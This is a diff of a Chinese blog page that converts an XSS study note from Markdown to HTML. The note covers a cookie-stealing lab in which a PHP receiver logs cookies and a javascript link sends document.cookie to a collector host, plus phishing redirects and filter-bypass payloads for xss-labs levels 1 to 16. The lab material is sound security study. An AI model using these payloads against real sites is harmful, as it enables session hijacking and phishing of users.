@@ -480,7 +480,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.7k
+                    1.3k
                 </div>
                 
 
@@ -502,285 +502,450 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
-### XSS
-
-- js
-- 注入类
-
-- 代码
-
+                <h3 id="xss">XSS</h3>
+<ul>
+<li><p>js</p></li>
+<li><p>注入类</p></li>
+<li><p>代码</p></li>
+</ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=&lt;button&gt;快来点我&lt;/button&gt;</span><br></pre></td></tr></table></figure>
-
-![image-20220824212859062](https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208242128200.png)
-
-- 攻击的是系统用户
-- 存在位置
-  - 在 `<script> </script>`中
-  - 在响应事件中
-  - 在超链接中
-
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208242128200.png"
+alt="image-20220824212859062" />
+<figcaption aria-hidden="true">image-20220824212859062</figcaption>
+</figure>
+<ul>
+<li>攻击的是系统用户</li>
+<li>存在位置
+<ul>
+<li>在 <code>&lt;script&gt; &lt;/script&gt;</code>中</li>
+<li>在响应事件中</li>
+<li>在超链接中</li>
+</ul></li>
+</ul>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> &gt;</span>点击有惊喜<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-- iframe 框架
-
+<ul>
+<li>iframe 框架</li>
+</ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://www.taobao.com&quot;/&gt;</span><br></pre></td></tr></table></figure>
-
-钓鱼网站、
-
+<p>钓鱼网站、</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;script&gt;document.write(&#x27;你的用户名不正确，请重新登录&#x27;);setTimeout(function()&#123;</span><br><span class="line">    location.href= &#x27;https://www.taobao.com&#x27;;</span><br><span class="line">&#125;,3000);</span><br><span class="line">&lt;/script&gt;&quot;;</span><br></pre></td></tr></table></figure>
-
-
-
-- 渗透步骤
-  - 输入点
-  - 网页源码
-  - 输出内容和输入内容之间的关系，构造闭合脚本
-
-- 技巧
-  - 拼接输入
-
-![image-20220825170727204](https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208251707261.png)
-
-### Xss 获取cookie 实验
-
-- 132 获取130机器cookie
-
+<ul>
+<li>渗透步骤
+<ul>
+<li>输入点</li>
+<li>网页源码</li>
+<li>输出内容和输入内容之间的关系，构造闭合脚本</li>
+</ul></li>
+<li>技巧
+<ul>
+<li>拼接输入</li>
+</ul></li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208251707261.png"
+alt="image-20220825170727204" />
+<figcaption aria-hidden="true">image-20220825170727204</figcaption>
+</figure>
+<h3 id="xss-获取cookie-实验">Xss 获取cookie 实验</h3>
+<ul>
+<li>132 获取130机器cookie</li>
+</ul>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$author</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];    <span class="comment">// 用成了post</span></span><br></pre></td></tr></table></figure>
-
-- 文章中插入js代码
-
-![image-20220826154354814](https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208261544976.png)
-
-![image-20220901172025344](https://cdn.jsdelivr.net/gh/A1phaMan7/pictureBed/img/202209011720406.png)
-
-
-
- ![获取cookie](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209101707280.png)
-
-- 发帖功能存在XSS漏洞
-
+<ul>
+<li>文章中插入js代码</li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208261544976.png"
+alt="image-20220826154354814" />
+<figcaption aria-hidden="true">image-20220826154354814</figcaption>
+</figure>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaMan7/pictureBed/img/202209011720406.png"
+alt="image-20220901172025344" />
+<figcaption aria-hidden="true">image-20220901172025344</figcaption>
+</figure>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209101707280.png"
+alt="获取cookie" />
+<figcaption aria-hidden="true">获取cookie</figcaption>
+</figure>
+<ul>
+<li>发帖功能存在XSS漏洞</li>
+</ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BUtton onclick = &quot;alert(documnet.cookie)&quot;&gt;点我有惊喜&lt;/BUtton&gt;</span><br></pre></td></tr></table></figure>
-
-- blue-lotus 安装: [参考](https://blog.csdn.net/qq_41683305/article/details/114282690)
-  - lampp 环境
-  - blue-lotus 登录面板设置：登录密码+数据加密密码
-
-![image-20220910230132488](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209102301653.png)
-
-- 一个lampp中的mysql 问题
-
-![image-20220910232531377](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209102325463.png)
-
+<ul>
+<li>blue-lotus 安装: <a
+target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41683305/article/details/114282690">参考</a>
+<ul>
+<li>lampp 环境</li>
+<li>blue-lotus 登录面板设置：登录密码+数据加密密码</li>
+</ul></li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209102301653.png"
+alt="image-20220910230132488" />
+<figcaption aria-hidden="true">image-20220910230132488</figcaption>
+</figure>
+<ul>
+<li>一个lampp中的mysql 问题</li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209102325463.png"
+alt="image-20220910232531377" />
+<figcaption aria-hidden="true">image-20220910232531377</figcaption>
+</figure>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#在xampp中的bin 文件夹启动mysql</span><br><span class="line">use mysql;</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> password<span class="operator">=</span>password(<span class="string">&#x27;123&#x27;</span>) <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> host<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
-
-- 回调的代码出错：
-
-![image-20220911152122560](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111521655.png)
-
-- 构建xss
-
+<ul>
+<li>回调的代码出错：</li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111521655.png"
+alt="image-20220911152122560" />
+<figcaption aria-hidden="true">image-20220911152122560</figcaption>
+</figure>
+<ul>
+<li>构建xss</li>
+</ul>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#132 xssReceive.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ipaddr</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$_COOKIE</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;数据库连接不成功.&#x27;</span>);</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into xssdata(ipaddr,url,cookie,createtime) value(&#x27;<span class="subst">$ipaddr</span>&#x27;, &#x27;<span class="subst">$url</span>&#x27;, &#x27;<span class="subst">$cookie</span>&#x27;, now())&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo &quot;&lt;script&gt;history.back();&lt;/script&gt;&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;loaction.href=&#x27;http://www.woniunote.com/&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line"><span class="comment">// http://192.168.104.132/xss/xssReceive.php?url=</span></span><br></pre></td></tr></table></figure>
-
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;javascript:loacation.href=&quot;http://192.168.104.132/xss/xssReceive.php?url=“+location.href+”&amp;cookie=&quot;+document.cookie&#x27;</span>&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.104.132/xss/01.png&quot;</span>/&gt;</span></span></span><br><span class="line">&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">\</span>&#x27; <span class="attr">javascript:loacation.href</span>=<span class="string">&quot;http://192.168.104.132/xss/xssReceive.php?url=&quot;</span>%<span class="attr">2Blocation.href</span>%<span class="attr">2B</span>&quot;%<span class="attr">26cookie</span>=<span class="string">&quot; %2Bdocument.cookie \&#x27;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">    &lt;img src=&quot;</span><span class="attr">http:</span>//<span class="attr">192.168.104.132</span>/<span class="attr">xss</span>/<span class="attr">01.png</span>&quot;/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-![image-20220911153950543](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111539634.png)
-
-![不需要点击的payload](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111559699.png)
-
-- 获取到cookie
-  - 直接访问文章页面
-  - 抓取请求报文
-  - 替换其中的cookie
-
-![image-20220911160834500](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111608617.png)
-
-### bluelotus
-
-- BlueLotus 无任何js模板**问题**
-
-![image-20220911170240529](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111702658.png)
-
-`solu`: 使用这个project-[最新firesunCN](https://github.com/firesunCN/BlueLotus_XSSReceiver)
-
-尝试手动安装
-
-![image-20220911171231139](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111712259.png)
-
-![image-20220911175501435](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111755540.png)
-
-### xss 攻防与绕过
-
-- 垂直越权与水平越权
-- xss 利用方式
-  - 获取cookie越权
-  - 钓鱼网站，获取私密信息，再毫无痕迹地跳到请求网站
-  - 执行js代码，对另一个站点实施攻击
-- xss 类型
-  - 反射型：payload来自用户输入
-  - 存储型：payload来自存储在数据库中的内容
-  - `DOM-based`
-- 防御
-  - `htmlspecialchars()`
-
-### xss-labs
-
-[github](https://github.com/do0dl3/xss-labs)
-
-[参考1](https://www.freebuf.com/articles/others-articles/339979.html)
-
-[参考2](https://zhuanlan.zhihu.com/p/451612357)
-
-- level-1
-
-![image-20220912000415096](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209120004239.png)
-
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111539634.png"
+alt="image-20220911153950543" />
+<figcaption aria-hidden="true">image-20220911153950543</figcaption>
+</figure>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111559699.png"
+alt="不需要点击的payload" />
+<figcaption aria-hidden="true">不需要点击的payload</figcaption>
+</figure>
+<ul>
+<li>获取到cookie
+<ul>
+<li>直接访问文章页面</li>
+<li>抓取请求报文</li>
+<li>替换其中的cookie</li>
+</ul></li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111608617.png"
+alt="image-20220911160834500" />
+<figcaption aria-hidden="true">image-20220911160834500</figcaption>
+</figure>
+<h3 id="bluelotus">bluelotus</h3>
+<ul>
+<li>BlueLotus 无任何js模板<strong>问题</strong></li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111702658.png"
+alt="image-20220911170240529" />
+<figcaption aria-hidden="true">image-20220911170240529</figcaption>
+</figure>
+<p><code>solu</code>: 使用这个project-<a
+target="_blank" rel="noopener" href="https://github.com/firesunCN/BlueLotus_XSSReceiver">最新firesunCN</a></p>
+<p>尝试手动安装</p>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111712259.png"
+alt="image-20220911171231139" />
+<figcaption aria-hidden="true">image-20220911171231139</figcaption>
+</figure>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111755540.png"
+alt="image-20220911175501435" />
+<figcaption aria-hidden="true">image-20220911175501435</figcaption>
+</figure>
+<h3 id="xss-攻防与绕过">xss 攻防与绕过</h3>
+<ul>
+<li>垂直越权与水平越权</li>
+<li>xss 利用方式
+<ul>
+<li>获取cookie越权</li>
+<li>钓鱼网站，获取私密信息，再毫无痕迹地跳到请求网站</li>
+<li>执行js代码，对另一个站点实施攻击</li>
+</ul></li>
+<li>xss 类型
+<ul>
+<li>反射型：payload来自用户输入</li>
+<li>存储型：payload来自存储在数据库中的内容</li>
+<li><code>DOM-based</code></li>
+</ul></li>
+<li>防御
+<ul>
+<li><code>htmlspecialchars()</code></li>
+</ul></li>
+</ul>
+<h3 id="xss-labs">xss-labs</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/do0dl3/xss-labs">github</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://www.freebuf.com/articles/others-articles/339979.html">参考1</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/451612357">参考2</a></p>
+<ul>
+<li>level-1</li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209120004239.png"
+alt="image-20220912000415096" />
+<figcaption aria-hidden="true">image-20220912000415096</figcaption>
+</figure>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.104.130/xss-labs/level1.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-- level-2
-
-![image-20220912002111411](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209120021466.png)
-
+<ul>
+<li>level-2</li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209120021466.png"
+alt="image-20220912002111411" />
+<figcaption aria-hidden="true">image-20220912002111411</figcaption>
+</figure>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#闭合双引号和尖括号</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert(&#x27;1&#x27;)<span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>
-
-- level-3
-
-> - 使用htmlspecialchars函数把预定义的字符&、”、 ’、<、>转换为HTML实体，防止浏览器将其作为HTML元素
->
-> - 但是默认是只编码双引号的，而且单引号无论如何都不转义。
->
-> - htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。
->
-> - 预定义的字符是：
->
->   -  '&' （和号）成为 &amp
->
->   -   ''（双引号）成为 &quot
->
->   - ' （单引号）成为 '
->
->   - < (小于)成为 &lt
->
->   - '>'(大于) 成为&gt
->
-
-**这题有毒**
-
-- level-4
-
-换成双引号
-
-- level-5
-  - 屏蔽script和onclick 标签
-
-![image-20220912112716944](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121127091.png)
-
-- level-6
-  - 屏蔽href: 大小写绕过
-
+<ul>
+<li>level-3</li>
+</ul>
+<blockquote>
+<ul>
+<li><p>使用htmlspecialchars函数把预定义的字符&amp;、”、
+’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素</p></li>
+<li><p>但是默认是只编码双引号的，而且单引号无论如何都不转义。</p></li>
+<li><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p></li>
+<li><p>预定义的字符是：</p>
+<ul>
+<li><p>'&amp;' （和号）成为 &amp;amp</p></li>
+<li><p>''（双引号）成为 &amp;quot</p></li>
+<li><p>' （单引号）成为 '</p></li>
+<li><p>&lt; (小于)成为 &amp;lt</p></li>
+<li><p>'&gt;'(大于) 成为&amp;gt</p></li>
+</ul></li>
+</ul>
+</blockquote>
+<p><strong>这题有毒</strong></p>
+<ul>
+<li>level-4</li>
+</ul>
+<p>换成双引号</p>
+<ul>
+<li>level-5
+<ul>
+<li>屏蔽script和onclick 标签</li>
+</ul></li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121127091.png"
+alt="image-20220912112716944" />
+<figcaption aria-hidden="true">image-20220912112716944</figcaption>
+</figure>
+<ul>
+<li>level-6
+<ul>
+<li>屏蔽href: 大小写绕过</li>
+</ul></li>
+</ul>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">hRef</span> =<span class="string">javascript:alert(1)</span> /<span class="attr">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-![image-20220912113640527](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121136620.png)
-
-- level-7
-  - 只过滤一次
-
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121136620.png"
+alt="image-20220912113640527" />
+<figcaption aria-hidden="true">image-20220912113640527</figcaption>
+</figure>
+<ul>
+<li>level-7
+<ul>
+<li>只过滤一次</li>
+</ul></li>
+</ul>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">scRScriptIpt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScriScriptpt</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-- level-8
-  - html 实体编码绕过
-
-![image-20220912133304600](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121333717.png)
-
-![image-20220912133349148](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121333191.png)
-
+<ul>
+<li>level-8
+<ul>
+<li>html 实体编码绕过</li>
+</ul></li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121333717.png"
+alt="image-20220912133304600" />
+<figcaption aria-hidden="true">image-20220912133304600</figcaption>
+</figure>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121333191.png"
+alt="image-20220912133349148" />
+<figcaption aria-hidden="true">image-20220912133349148</figcaption>
+</figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;a hRef =javascript:alert(1) /a&gt;</span><br><span class="line">javascript:alert(1) </span><br><span class="line">html encode:</span><br><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br></pre></td></tr></table></figure>
-
-- level-9
-  - 判断有无 `http://`
-
-![image-20220912135434273](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121354347.png)
-
+<ul>
+<li>level-9
+<ul>
+<li>判断有无 <code>http://</code></li>
+</ul></li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121354347.png"
+alt="image-20220912135434273" />
+<figcaption aria-hidden="true">image-20220912135434273</figcaption>
+</figure>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)//http://www.baidu.com</span><br><span class="line"># 保留http://，其余编码</span><br></pre></td></tr></table></figure>
-
-- level-10
-
+<ul>
+<li>level-10</li>
+</ul>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 测试</span><br><span class="line">&#x27;&#x27; &#x27; &gt;&lt; script onclick</span><br></pre></td></tr></table></figure>
-
-![三个隐藏标签](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121425836.png)
-
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121425836.png"
+alt="三个隐藏标签" />
+<figcaption aria-hidden="true">三个隐藏标签</figcaption>
+</figure>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 检测试探隐藏<span class="selector-tag">input</span></span><br><span class="line">t_link=&quot; type=&#x27;text&#x27;&gt;//&amp;t_history=&quot; type=&#x27;text&#x27;&gt;//&amp;t_sort=&quot; type=&#x27;text&#x27;&gt;//</span><br></pre></td></tr></table></figure>
-
-![image-20220912163849675](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121638743.png)
-
-![image-20220912164028316](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121640380.png)
-
-- level-11
-
-![image-20220912165658683](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121656755.png)
-
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121638743.png"
+alt="image-20220912163849675" />
+<figcaption aria-hidden="true">image-20220912163849675</figcaption>
+</figure>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121640380.png"
+alt="image-20220912164028316" />
+<figcaption aria-hidden="true">image-20220912164028316</figcaption>
+</figure>
+<ul>
+<li>level-11</li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121656755.png"
+alt="image-20220912165658683" />
+<figcaption aria-hidden="true">image-20220912165658683</figcaption>
+</figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_link=&quot; type=&#x27;text&#x27;&gt;//&amp;t_history=&quot; type=&#x27;text&#x27;&gt;//&amp;t_sort=&quot; type=&#x27;text&#x27;&gt;//&amp;t_ref=&quot; type=&#x27;text&#x27;&gt;//</span><br></pre></td></tr></table></figure>
-
-![image-20220912165738998](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121657058.png)
-
-
-
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121657058.png"
+alt="image-20220912165738998" />
+<figcaption aria-hidden="true">image-20220912165738998</figcaption>
+</figure>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=&#x27;text&#x27; onclick=&#x27;javascript:alert(1)&#x27;&gt;//</span><br></pre></td></tr></table></figure>
-
-![image-20220912171448180](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121714232.png)
-
-![image-20220912171155369](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121711484.png)
-
-- level-12
-
-![image-20220912172222423](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121722473.png)
-
-![image-20220912172701532](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121727641.png)
-
-- level-13
-
-![image-20220912173428363](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121734412.png)
-
-![image-20220912173841722](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121738835.png)
-
-- level-14
-  - exif
-  - 有些网站有读取图片exif信息的功能，当网站读取到的恶意的exif信息就会触发这个payload
-
-![img](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121957712.png)
-
-- level-15
-
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121714232.png"
+alt="image-20220912171448180" />
+<figcaption aria-hidden="true">image-20220912171448180</figcaption>
+</figure>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121711484.png"
+alt="image-20220912171155369" />
+<figcaption aria-hidden="true">image-20220912171155369</figcaption>
+</figure>
+<ul>
+<li>level-12</li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121722473.png"
+alt="image-20220912172222423" />
+<figcaption aria-hidden="true">image-20220912172222423</figcaption>
+</figure>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121727641.png"
+alt="image-20220912172701532" />
+<figcaption aria-hidden="true">image-20220912172701532</figcaption>
+</figure>
+<ul>
+<li>level-13</li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121734412.png"
+alt="image-20220912173428363" />
+<figcaption aria-hidden="true">image-20220912173428363</figcaption>
+</figure>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121738835.png"
+alt="image-20220912173841722" />
+<figcaption aria-hidden="true">image-20220912173841722</figcaption>
+</figure>
+<ul>
+<li>level-14
+<ul>
+<li>exif</li>
+<li>有些网站有读取图片exif信息的功能，当网站读取到的恶意的exif信息就会触发这个payload</li>
+</ul></li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121957712.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<ul>
+<li>level-15</li>
+</ul>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.104.130/xss-labs/level15.php?src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>
-
-![image-20220912202525209](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122025344.png)
-
-- level-16
-
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122025344.png"
+alt="image-20220912202525209" />
+<figcaption aria-hidden="true">image-20220912202525209</figcaption>
+</figure>
+<ul>
+<li>level-16</li>
+</ul>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 试探</span><br><span class="line">“ ‘ <span class="tag">&lt;&gt;</span> script onerror  onclick</span><br></pre></td></tr></table></figure>
-
-> - 空格可以使用%0a和%0d替换
-
+<blockquote>
+<ul>
+<li>空格可以使用%0a和%0d替换</li>
+</ul>
+</blockquote>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0asrc=1%0donerror=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>
-
-![image-20220912234430705](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122344830.png)
-
-- level-17
-
